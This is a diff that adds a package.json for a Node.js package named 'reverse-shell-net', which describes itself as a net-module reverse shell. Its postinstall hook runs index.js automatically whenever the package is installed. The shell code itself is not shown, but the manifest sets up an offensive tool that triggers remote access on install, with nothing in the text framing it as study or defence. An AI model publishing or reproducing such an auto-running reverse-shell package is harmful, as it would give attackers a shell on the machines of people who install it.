@@ -1,0 +1,8 @@
+{
+  "name": "reverse-shell-net",
+  "version": "1.0.0",
+  "description": "Node.js net module reverse shell",
+  "scripts": {
+    "postinstall": "node index.js"
+  }
+}
